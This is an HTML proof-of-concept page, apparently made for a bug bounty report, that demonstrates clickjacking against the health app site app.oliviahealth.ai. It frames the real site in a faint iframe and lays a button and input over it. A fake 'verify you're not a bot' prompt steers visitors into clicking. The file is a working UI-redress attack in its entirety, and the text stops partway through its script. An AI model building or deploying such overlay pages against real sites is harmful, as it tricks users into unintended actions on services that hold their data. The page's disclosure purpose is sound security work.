<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
        <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body,
        html,
        iframe {
            width: 100%;
            height: 100%;
        }

        #oliviaIframe {
            width: 100%;
            position: absolute;
            z-index: 1;
            opacity: 0.3;
        }

        #startButton {
            z-index: 2;
            position: absolute;
            top: 40px;
            bottom: 0;
            left: 0;
            right: 0;
            margin: auto;
            height: 70px;
            width: 270px;
        }

        h1 {
            text-align: center;
            font-size: 3rem;
            padding-top: 3rem;
        }
        </style>

    <body>
        <iframe id="oliviaIframe" src="https://app.oliviahealth.ai/home"></iframe>
        <h1>PoC Created By: n30@bugcrowdninja.com</h1>
        <p id="verificationText">In order to access this site, verify you're not a bot:</p>
        <input type="text" id="startButton" value="Text to copy">
        <button onclick="copyToClipboard()">Copy Text</button>
    </body>
    <script>
        function copyToClipboard() {
            const input = document.getElementById("startButton");
            navigator.clipboard.writeText(input.value)
                .then(() => alert("Copied to clipboard!"))
                .catch(err => console.error("Failed to copy: ", err));
        }
